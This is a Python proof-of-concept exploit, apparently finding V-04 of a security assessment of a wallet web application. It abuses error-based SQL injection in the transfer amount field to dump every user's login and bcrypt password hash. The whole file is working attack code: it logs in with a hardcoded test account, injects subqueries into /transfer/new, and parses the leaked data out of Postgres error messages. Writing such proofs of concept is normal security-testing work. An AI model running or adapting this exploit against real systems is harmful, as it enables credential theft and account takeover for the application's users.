# -*- coding: utf-8 -*-
"""V-04. SQL-инъекция в сумме перевода (error-based).

handlers_money.go: при неразборчивой сумме выполняется
  fmt.Sprintf("SELECT %s::bigint", amountStr)
и текст ошибки Postgres возвращается пользователю. Приведение текста к bigint
роняет запрос с сообщением, содержащим сам текст — классический error-based.
Сливаем логины и bcrypt-хэши всех пользователей.
"""
import html
import re

from wallet_client import Client, parser, banner, ok, fail


def leak(client, expr):
    payload = f"(SELECT {expr})"
    body = client.post_form("/transfer/new", {
        "recipient": "ivanov", "amount_rub": payload, "memo": "x"})[2]
    txt = html.unescape(body.decode("utf-8", "replace"))
    m = re.search(r'invalid input syntax for type bigint: "(.*?)"', txt)
    return m.group(1) if m else None


def main():
    a = parser("Error-based SQLi в переводе").parse_args()
    c = Client(a.base)
    c.login("ivanov", "workplace1")

    ver = leak(c, "version()")
    banner(f"version() -> {ver}")

    dump = leak(c, "string_agg(login || ':' || password_hash, '; ') FROM users")
    if not dump or "$2" not in dump:
        fail(f"не удалось вытащить хэши: {dump!r}")
    for row in dump.split("; "):
        banner(row)
    ok("через SQLi слиты логины и bcrypt-хэши всех пользователей")


if __name__ == "__main__":
    main()
